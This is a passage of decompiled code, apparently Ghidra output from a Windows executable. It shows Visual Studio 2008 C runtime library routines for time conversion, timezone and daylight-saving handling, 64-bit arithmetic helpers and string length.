  lVar12 = __allmul((uint)lVar12,(uint)((ulonglong)lVar12 >> 0x20),0x15180,0);
  lVar12 = lVar12 + lVar13;
  iVar8 = (int)lVar12;
  if ((lVar12 < 0x100000000) && (lVar12 < 0)) {
    lVar12 = lVar12 + 0x1e13380;
    uVar5 = (uint)ptVar1 & 0x80000003;
    bVar10 = uVar5 == 0;
    if ((int)uVar5 < 0) {
      bVar10 = (uVar5 - 1 | 0xfffffffc) == 0xffffffff;
    }
    _Tm = ptVar1;
    if (((!bVar10) || ((int)ptVar1 % 100 == 0)) && ((int)(uVar9 + 0x7b1) % 400 != 0))
    goto LAB_0040817c;
    lVar12 = CONCAT44((int)((ulonglong)lVar12 >> 0x20) + (uint)(0xfffeae7f < (uint)lVar12),
                      iVar8 + 0x1e28500);
  }
  else {
    uVar5 = (uint)_Tm & 0x80000003;
    bVar10 = uVar5 == 0;
    if ((int)uVar5 < 0) {
      bVar10 = (uVar5 - 1 | 0xfffffffc) == 0xffffffff;
    }
    if (((!bVar10) || ((int)_Tm % 100 == 0)) && ((int)(uVar9 + 0x7b2) % 400 != 0))
    goto LAB_0040817c;
  }
  bVar2 = true;
LAB_0040817c:
  local_10 = (uint)((ulonglong)lVar12 >> 0x20);
  ptVar3->tm_year = (int)_Tm;
  uVar11 = __alldiv((uint)lVar12,local_10,0x15180,0);
  uVar9 = (uint)uVar11;
  ptVar3->tm_yday = uVar9;
  lVar13 = __allmul(uVar9,(int)uVar9 >> 0x1f,0xfffeae80,0xffffffff);
  lVar13 = lVar13 + lVar12;
  puVar7 = (undefined4 *)&DAT_00418268;
  if (!bVar2) {
    puVar7 = &DAT_0041829c;
  }
  iVar6 = 1;
  iVar8 = puVar7[1];
  while (iVar8 < ptVar3->tm_yday) {
    iVar6 = iVar6 + 1;
    iVar8 = puVar7[iVar6];
  }
  ptVar3->tm_mon = iVar6 + -1;
  ptVar3->tm_mday = ptVar3->tm_yday - puVar7[iVar6 + -1];
  uVar11 = __alldiv(*(uint *)_Time,*(uint *)((int)_Time + 4),0x15180,0);
  ptVar3->tm_wday = ((int)uVar11 + 4) % 7;
  uVar11 = __alldiv((uint)lVar13,(uint)((ulonglong)lVar13 >> 0x20),0xe10,0);
  uVar9 = (uint)uVar11;
  ptVar3->tm_hour = uVar9;
  lVar12 = __allmul(uVar9,(int)uVar9 >> 0x1f,0xfffff1f0,0xffffffff);
  uVar9 = (uint)(lVar13 + lVar12);
  uVar11 = __alldiv(uVar9,(uint)((ulonglong)(lVar13 + lVar12) >> 0x20),0x3c,0);
  ptVar3->tm_min = (int)uVar11;
  ptVar3->tm_isdst = 0;
  ptVar3->tm_sec = uVar9 + (int)uVar11 * -0x3c;
  return 0;
}



// Library Function - Single Match
//  __localtime64_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __localtime64_s(tm *_Tm,__time64_t *_Time)

{
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  bool bVar8;
  undefined8 uVar9;
  longlong lVar10;
  uint local_18;
  int local_14;
  uint local_10;
  int local_c;
  uint local_8;
  
  local_c = 0;
  local_10 = 0;
  local_8 = 0;
  if (_Tm == (tm *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  _memset(_Tm,0xff,0x24);
  if (_Time == (__time64_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  iVar3 = *(int *)((int)_Time + 4);
  if (((iVar3 < 1) && (iVar3 < 0)) ||
     ((6 < iVar3 && ((7 < iVar3 || (0x93406fff < *(uint *)_Time)))))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    return 0x16;
  }
  ___tzset();
  eVar2 = __get_daylight(&local_c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  eVar2 = __get_dstbias((long *)&local_10);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  eVar2 = __get_timezone((long *)&local_8);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  iVar3 = *(int *)((int)_Time + 4);
  uVar6 = *(uint *)_Time;
  if ((-1 < iVar3) && ((0 < iVar3 || (0x3f480 < uVar6)))) {
    local_18 = uVar6 - local_8;
    local_14 = (iVar3 - ((int)local_8 >> 0x1f)) - (uint)(uVar6 < local_8);
    eVar2 = __gmtime64_s(_Tm,(__time64_t *)&local_18);
    if (eVar2 != 0) {
      return eVar2;
    }
    if (local_c == 0) {
      return 0;
    }
    iVar3 = __isindst(_Tm);
    if (iVar3 == 0) {
      return 0;
    }
    bVar8 = local_18 < local_10;
    local_18 = local_18 - local_10;
    local_14 = (local_14 - ((int)local_10 >> 0x1f)) - (uint)bVar8;
    eVar2 = __gmtime64_s(_Tm,(__time64_t *)&local_18);
    if (eVar2 == 0) {
      _Tm->tm_isdst = 1;
      return 0;
    }
    return eVar2;
  }
  eVar2 = __gmtime64_s(_Tm,_Time);
  if (eVar2 != 0) {
    return eVar2;
  }
  if ((local_c == 0) || (iVar3 = __isindst(_Tm), iVar3 == 0)) {
    uVar6 = _Tm->tm_sec;
    uVar7 = uVar6 - local_8;
    uVar6 = (((int)uVar6 >> 0x1f) - ((int)local_8 >> 0x1f)) - (uint)(uVar6 < local_8);
  }
  else {
    uVar4 = local_8 + local_10;
    uVar6 = _Tm->tm_sec;
    uVar7 = uVar6 - uVar4;
    uVar6 = (((int)uVar6 >> 0x1f) - ((int)uVar4 >> 0x1f)) - (uint)(uVar6 < uVar4);
    _Tm->tm_isdst = 1;
  }
  uVar9 = __allrem(uVar7,uVar6,0x3c,0);
  iVar3 = (int)uVar9;
  _Tm->tm_sec = iVar3;
  if (iVar3 < 0) {
    bVar8 = 0x3b < uVar7;
    uVar7 = uVar7 - 0x3c;
    _Tm->tm_sec = iVar3 + 0x3c;
    uVar6 = (uVar6 - 1) + (uint)bVar8;
  }
  lVar10 = __alldiv(uVar7,uVar6,0x3c,0);
  lVar10 = lVar10 + _Tm->tm_min;
  uVar9 = __allrem((uint)lVar10,(uint)((ulonglong)lVar10 >> 0x20),0x3c,0);
  iVar3 = (int)uVar9;
  _Tm->tm_min = iVar3;
  if (iVar3 < 0) {
    _Tm->tm_min = iVar3 + 0x3c;
    lVar10 = lVar10 + -0x3c;
  }
  lVar10 = __alldiv((uint)lVar10,(uint)((ulonglong)lVar10 >> 0x20),0x3c,0);
  lVar10 = lVar10 + _Tm->tm_hour;
  uVar9 = __allrem((uint)lVar10,(uint)((ulonglong)lVar10 >> 0x20),0x18,0);
  iVar3 = (int)uVar9;
  _Tm->tm_hour = iVar3;
  if (iVar3 < 0) {
    _Tm->tm_hour = iVar3 + 0x18;
    lVar10 = lVar10 + -0x18;
  }
  lVar10 = __alldiv((uint)lVar10,(uint)((ulonglong)lVar10 >> 0x20),0x18,0);
  iVar5 = (int)((ulonglong)lVar10 >> 0x20);
  iVar3 = (int)lVar10;
  if (-1 < lVar10) {
    if ((iVar5 != 0 && -1 < lVar10) || (iVar3 != 0)) {
      _Tm->tm_mday = _Tm->tm_mday + iVar3;
      _Tm->tm_wday = (_Tm->tm_wday + iVar3) % 7;
      goto LAB_004084aa;
    }
    if (iVar5 != 0 && -1 < lVar10) {
      return 0;
    }
    if (-1 < lVar10) {
      return 0;
    }
  }
  _Tm->tm_mday = _Tm->tm_mday + iVar3;
  _Tm->tm_wday = (iVar3 + 7 + _Tm->tm_wday) % 7;
  if (_Tm->tm_mday < 1) {
    _Tm->tm_yday = _Tm->tm_yday + iVar3 + 0x16d;
    _Tm->tm_year = _Tm->tm_year + -1;
    _Tm->tm_mday = _Tm->tm_mday + 0x1f;
    _Tm->tm_mon = 0xb;
    return 0;
  }
LAB_004084aa:
  _Tm->tm_yday = _Tm->tm_yday + iVar3;
  return 0;
}



// Library Function - Single Match
//  __get_daylight
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_daylight(int *_Daylight)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_Daylight == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_Daylight = DAT_004181bc;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Single Match
//  __get_dstbias
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_dstbias(long *_Daylight_savings_bias)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_Daylight_savings_bias == (long *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_Daylight_savings_bias = DAT_004181c0;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __get_dstbias
//  __get_timezone
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_timezone(long *_Timezone)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_Timezone == (long *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_Timezone = DAT_004181b8;
    eVar2 = 0;
  }
  return eVar2;
}



undefined4 * FUN_0040859e(void)

{
  return &DAT_004181bc;
}



undefined4 * FUN_004085a4(void)

{
  return &DAT_004181c0;
}



undefined4 * FUN_004085aa(void)

{
  return &DAT_004181b8;
}



undefined ** FUN_004085b0(void)

{
  return &PTR_DAT_00418248;
}



// Library Function - Multiple Matches With Different Base Names
//  __set_daylight
//  __set_dstbias
//  __set_timezone
// 
// Library: Visual Studio 2008 Release

void __cdecl FID_conflict___set_dstbias(long _Value)

{
  long *plVar1;
  
  plVar1 = FUN_0040859e();
  *plVar1 = _Value;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __set_daylight
//  __set_dstbias
//  __set_timezone
// 
// Library: Visual Studio 2008 Release

void __cdecl FID_conflict___set_dstbias(long _Value)

{
  long *plVar1;
  
  plVar1 = FUN_004085a4();
  *plVar1 = _Value;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __set_daylight
//  __set_dstbias
//  __set_timezone
// 
// Library: Visual Studio 2008 Release

void __cdecl FID_conflict___set_dstbias(long _Value)

{
  long *plVar1;
  
  plVar1 = FUN_004085aa();
  *plVar1 = _Value;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __tzset_nolock
// 
// Library: Visual Studio 2008 Release

void __tzset_nolock(void)

{
  char cVar1;
  char cVar2;
  LPSTR *ppCVar3;
  int iVar4;
  errno_t eVar5;
  UINT CodePage;
  char *_Str1;
  int iVar6;
  size_t sVar7;
  DWORD DVar8;
  long lVar9;
  int *piVar10;
  char *pcVar11;
  int local_34;
  int local_30;
  int local_2c;
  int local_28;
  LPSTR *local_24;
  int local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00416a10;
  uStack_c = 0x4085f5;
  local_30 = 0;
  local_20[0] = 0;
  local_28 = 0;
  local_2c = 0;
  local_24 = (LPSTR *)0x0;
  __lock(7);
  local_8 = (undefined *)0x0;
  local_24 = FUN_004085b0();
  eVar5 = __get_timezone(local_20);
  if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  eVar5 = __get_daylight(&local_28);
  if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  eVar5 = __get_dstbias(&local_2c);
  if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  CodePage = ____lc_codepage_func();
  DAT_0041954c = 0;
  DAT_0041825c = 0xffffffff;
  DAT_00418250 = 0xffffffff;
  _Str1 = __getenv_helper_nolock("TZ");
  if ((_Str1 == (char *)0x0) || (*_Str1 == '\0')) {
    if (DAT_00419550 != (char *)0x0) {
      _free(DAT_00419550);
      DAT_00419550 = (char *)0x0;
    }
    DVar8 = GetTimeZoneInformation((LPTIME_ZONE_INFORMATION)&DAT_004194a0);
    if (DVar8 != 0xffffffff) {
      DAT_0041954c = 1;
      local_20[0] = DAT_004194a0 * 0x3c;
      if (DAT_004194e6 != 0) {
        local_20[0] = local_20[0] + DAT_004194f4 * 0x3c;
      }
      if ((DAT_0041953a == 0) || (DAT_00419548 == 0)) {
        local_28 = 0;
        local_2c = 0;
      }
      else {
        local_28 = 1;
        local_2c = (DAT_00419548 - DAT_004194f4) * 0x3c;
      }
      iVar6 = WideCharToMultiByte(CodePage,0,(LPCWSTR)&DAT_004194a4,-1,*local_24,0x3f,(LPCSTR)0x0,
                                  &local_34);
      if ((iVar6 == 0) || (local_34 != 0)) {
        **local_24 = '\0';
      }
      else {
        (*local_24)[0x3f] = '\0';
      }
      iVar6 = WideCharToMultiByte(CodePage,0,(LPCWSTR)&DAT_004194f8,-1,local_24[1],0x3f,(LPCSTR)0x0,
                                  &local_34);
      if ((iVar6 == 0) || (local_34 != 0)) {
        *local_24[1] = '\0';
      }
      else {
        local_24[1][0x3f] = '\0';
      }
    }
  }
  else {
    if (DAT_00419550 != (char *)0x0) {
      iVar6 = _strcmp(_Str1,DAT_00419550);
      if (iVar6 == 0) goto LAB_00408805;
      if (DAT_00419550 != (char *)0x0) {
        _free(DAT_00419550);
      }
    }
    sVar7 = _strlen(_Str1);
    DAT_00419550 = (char *)__malloc_crt(sVar7 + 1);
    if (DAT_00419550 != (char *)0x0) {
      pcVar11 = _Str1;
      sVar7 = _strlen(_Str1);
      eVar5 = _strcpy_s(DAT_00419550,sVar7 + 1,pcVar11);
      if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      goto LAB_0040880c;
    }
  }
LAB_00408805:
  local_30 = 1;
LAB_0040880c:
  FID_conflict___set_dstbias(local_20[0]);
  FID_conflict___set_dstbias(local_28);
  FID_conflict___set_dstbias(local_2c);
  local_8 = (undefined *)0xfffffffe;
  FUN_00408895();
  ppCVar3 = local_24;
  if (local_30 == 0) {
    eVar5 = _strncpy_s(*local_24,0x40,_Str1,3);
    if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    pcVar11 = _Str1 + 3;
    cVar2 = *pcVar11;
    if (cVar2 == '-') {
      pcVar11 = _Str1 + 4;
    }
    lVar9 = _atol(pcVar11);
    local_20[0] = lVar9 * 0xe10;
    for (; (cVar1 = *pcVar11, cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':'))));
        pcVar11 = pcVar11 + 1) {
    }
    if (*pcVar11 == ':') {
      pcVar11 = pcVar11 + 1;
      lVar9 = _atol(pcVar11);
      local_20[0] = local_20[0] + lVar9 * 0x3c;
      for (; ('/' < *pcVar11 && (*pcVar11 < ':')); pcVar11 = pcVar11 + 1) {
      }
      if (*pcVar11 == ':') {
        pcVar11 = pcVar11 + 1;
        lVar9 = _atol(pcVar11);
        local_20[0] = local_20[0] + lVar9;
        for (; ('/' < *pcVar11 && (*pcVar11 < ':')); pcVar11 = pcVar11 + 1) {
        }
      }
    }
    if (cVar2 == '-') {
      local_20[0] = -local_20[0];
    }
    local_28 = (int)*pcVar11;
    if (local_28 == 0) {
      *ppCVar3[1] = '\0';
    }
    else {
      eVar5 = _strncpy_s(ppCVar3[1],0x40,pcVar11,3);
      if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
    }
    iVar4 = local_20[0];
    piVar10 = FUN_004085aa();
    iVar6 = local_28;
    *piVar10 = iVar4;
    piVar10 = FUN_0040859e();
    *piVar10 = iVar6;
  }
  return;
}



void FUN_00408895(void)

{
  FUN_0040a124(7);
  return;
}



// Library Function - Single Match
//  _cvtdate
// 
// Library: Visual Studio 2008 Release

int __thiscall
_cvtdate(void *this,int param_1,int param_2,uint param_3,int param_4,int param_5,int param_6,
        int param_7,int param_8,int param_9)

{
  int in_EAX;
  uint uVar1;
  int iVar2;
  errno_t eVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  bool bVar7;
  int local_8;
  
  local_8 = 0;
  if (param_2 == 1) {
    uVar1 = param_3 & 0x80000003;
    if ((int)uVar1 < 0) {
      uVar1 = (uVar1 - 1 | 0xfffffffc) + 1;
    }
    if (((uVar1 == 0) && ((int)param_3 % 100 != 0)) || ((int)(param_3 + 0x76c) % 400 == 0)) {
      iVar4 = (&DAT_00418264)[in_EAX];
    }
    else {
      iVar4 = *(int *)(&DAT_00418298 + in_EAX * 4);
    }
    iVar6 = iVar4 + 1;
    iVar5 = (int)(param_3 * 0x16d + -0x63db +
                 ((int)((param_3 - 1) + ((int)(param_3 - 1) >> 0x1f & 3U)) >> 2) + iVar6 +
                 ((int)(param_3 + 299) / 400 - (int)(param_3 - 1) / 100)) % 7;
    iVar2 = (param_4 * 7 - iVar5) + param_5;
    if (iVar5 <= param_5) {
      iVar6 = iVar4 + -6;
    }
    iVar6 = iVar6 + iVar2;
    if (param_4 == 5) {
      if (((uVar1 == 0) && ((int)param_3 % 100 != 0)) || ((int)(param_3 + 0x76c) % 400 == 0)) {
        iVar2 = *(int *)(&DAT_00418268 + in_EAX * 4);
      }
      else {
        iVar2 = (&DAT_0041829c)[in_EAX];
      }
      if (iVar2 < iVar6) {
        iVar6 = iVar6 + -7;
      }
    }
  }
  else {
    uVar1 = param_3 & 0x80000003;
    bVar7 = uVar1 == 0;
    if ((int)uVar1 < 0) {
      bVar7 = (uVar1 - 1 | 0xfffffffc) == 0xffffffff;
    }
    if (((bVar7) && (iVar2 = (int)param_3 / 100, (int)param_3 % 100 != 0)) ||
       (iVar2 = (int)(param_3 + 0x76c) / 400, (int)(param_3 + 0x76c) % 400 == 0)) {
      iVar6 = (&DAT_00418264)[in_EAX];
    }
    else {
      iVar6 = *(int *)(&DAT_00418298 + in_EAX * 4);
    }
    iVar6 = iVar6 + param_6;
  }
  iVar4 = (((int)this * 0x3c + param_7) * 0x3c + param_8) * 1000 + param_9;
  if (param_1 == 1) {
    DAT_00418250 = param_3;
    DAT_00418254 = iVar6;
    DAT_00418258 = iVar4;
  }
  else {
    DAT_00418260 = iVar6;
    DAT_00418264 = iVar4;
    eVar3 = __get_dstbias(&local_8);
    if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    iVar2 = local_8 * 1000;
    DAT_00418264 = DAT_00418264 + iVar2;
    if (DAT_00418264 < 0) {
      DAT_00418264 = DAT_00418264 + 86400000;
      DAT_00418260 = DAT_00418260 + -1;
    }
    else {
      iVar2 = 86400000;
      if (86399999 < DAT_00418264) {
        DAT_00418264 = DAT_00418264 + -86400000;
        DAT_00418260 = DAT_00418260 + 1;
      }
    }
    DAT_0041825c = param_3;
  }
  return iVar2;
}



// Library Function - Single Match
//  __isindst_nolock
// 
// Library: Visual Studio 2008 Release

bool __isindst_nolock(void)

{
  bool bVar1;
  errno_t eVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  int *unaff_EDI;
  uint uVar7;
  uint uVar8;
  int local_c;
  int local_8;
  
  local_8 = 0;
  eVar2 = __get_daylight(&local_8);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (local_8 == 0) {
    return false;
  }
  uVar7 = unaff_EDI[5];
  if ((uVar7 != DAT_00418250) || (uVar7 != DAT_0041825c)) {
    if (DAT_0041954c == 0) {
      iVar6 = 2;
      local_c = 1;
      if ((int)uVar7 < 0x6b) {
        iVar6 = 1;
        local_c = 5;
      }
      _cvtdate((void *)0x2,1,1,uVar7,iVar6,0,0,0,0,0);
      _cvtdate((void *)0x2,0,1,unaff_EDI[5],local_c,0,0,0,0,0);
    }
    else {
      if (DAT_00419538 != 0) {
        uVar8 = (uint)DAT_0041953e;
        uVar3 = 0;
        uVar4 = 0;
      }
      else {
        uVar3 = (uint)DAT_0041953c;
        uVar8 = 0;
        uVar4 = (uint)DAT_0041953e;
      }
      _cvtdate((void *)(uint)DAT_00419540,1,(uint)(DAT_00419538 == 0),uVar7,uVar4,uVar3,uVar8,
               (uint)DAT_00419542,(uint)DAT_00419544,(uint)DAT_00419546);
      if (DAT_004194e4 != 0) {
        uVar8 = (uint)DAT_004194ea;
        uVar3 = 0;
        uVar4 = 0;
        uVar7 = unaff_EDI[5];
      }
      else {
        uVar3 = (uint)DAT_004194e8;
        uVar8 = 0;
        uVar4 = (uint)DAT_004194ea;
        uVar7 = unaff_EDI[5];
      }
      _cvtdate((void *)(uint)DAT_004194ec,0,(uint)(DAT_004194e4 == 0),uVar7,uVar4,uVar3,uVar8,
               (uint)DAT_004194ee,(uint)DAT_004194f0,(uint)DAT_004194f2);
    }
  }
  iVar6 = unaff_EDI[7];
  if (DAT_00418254 < DAT_00418260) {
    if ((iVar6 < DAT_00418254) || (DAT_00418260 < iVar6)) {
      return false;
    }
    if ((DAT_00418254 < iVar6) && (iVar6 < DAT_00418260)) {
      return true;
    }
  }
  else {
    if (iVar6 < DAT_00418260) {
      return true;
    }
    if (DAT_00418254 < iVar6) {
      return true;
    }
    if ((DAT_00418260 < iVar6) && (iVar6 < DAT_00418254)) {
      return false;
    }
  }
  iVar5 = ((unaff_EDI[2] * 0x3c + unaff_EDI[1]) * 0x3c + *unaff_EDI) * 1000;
  if (iVar6 == DAT_00418254) {
    bVar1 = DAT_00418258 <= iVar5;
  }
  else {
    bVar1 = iVar5 < DAT_00418264;
  }
  return bVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___tzset
// 
// Library: Visual Studio 2008 Release

void __cdecl ___tzset(void)

{
  if (DAT_00419554 == 0) {
    __lock(6);
    if (DAT_00419554 == 0) {
      __tzset_nolock();
      DAT_00419554 = DAT_00419554 + 1;
    }
    FUN_00408d44();
  }
  return;
}



void FUN_00408d44(void)

{
  FUN_0040a124(6);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __isindst
// 
// Library: Visual Studio 2008 Release

int __cdecl __isindst(tm *_Time)

{
  bool bVar1;
  undefined3 extraout_var;
  
  __lock(6);
  bVar1 = __isindst_nolock();
  FUN_00408d85();
  return CONCAT31(extraout_var,bVar1);
}



void FUN_00408d85(void)

{
  FUN_0040a124(6);
  return;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2008 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio 2008 Release

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __allrem
// 
// Library: Visual Studio 2008 Release

undefined8 __allrem(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  bool bVar12;
  bool bVar13;
  
  bVar13 = (int)param_2 < 0;
  if (bVar13) {
    bVar12 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar12 - param_2;
  }
  uVar11 = (uint)bVar13;
  if ((int)param_4 < 0) {
    bVar13 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar13 - param_4;
  }
  uVar3 = param_1;
  uVar4 = param_3;
  uVar8 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    iVar5 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) %
                 (ulonglong)param_3);
    iVar6 = 0;
    if ((int)(uVar11 - 1) < 0) goto LAB_00408f2d;
  }
  else {
    do {
      uVar10 = uVar9 >> 1;
      uVar4 = uVar4 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar8 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar8 = uVar7;
      uVar9 = uVar10;
    } while (uVar10 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar4;
    uVar3 = (int)uVar1 * param_4;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_3;
    uVar8 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar9 = uVar8 + uVar3;
    if (((CARRY4(uVar8,uVar3)) || (param_2 < uVar9)) || ((param_2 <= uVar9 && (param_1 < uVar4)))) {
      bVar13 = uVar4 < param_3;
      uVar4 = uVar4 - param_3;
      uVar9 = (uVar9 - param_4) - (uint)bVar13;
    }
    iVar5 = uVar4 - param_1;
    iVar6 = (uVar9 - param_2) - (uint)(uVar4 < param_1);
    if (-1 < (int)(uVar11 - 1)) goto LAB_00408f2d;
  }
  bVar13 = iVar5 != 0;
  iVar5 = -iVar5;
  iVar6 = -(uint)bVar13 - iVar6;
LAB_00408f2d:
  return CONCAT44(iVar6,iVar5);
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00408fa3;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00408fa3:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  ___check_float_string
// 
// Library: Visual Studio 2008 Release

